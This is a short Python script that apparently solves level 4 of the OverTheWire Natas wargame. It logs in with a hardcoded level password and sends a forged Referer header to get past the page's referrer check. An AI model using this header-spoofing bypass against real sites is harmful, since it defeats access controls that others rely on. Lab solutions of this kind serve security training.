
#!/bin/env python
 
import requests
import re

username = 'natas4'
password = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'

url = 'http://%s.natas.labs.overthewire.org/index.php' % username 

headers = {"Referer" : "http://natas5.natas.labs.overthewire.org/"}

request = requests.get(url, auth = (username, password), headers = headers)
content = request.text
print content
#print re.findall('natas4:(.*)', content)[0]


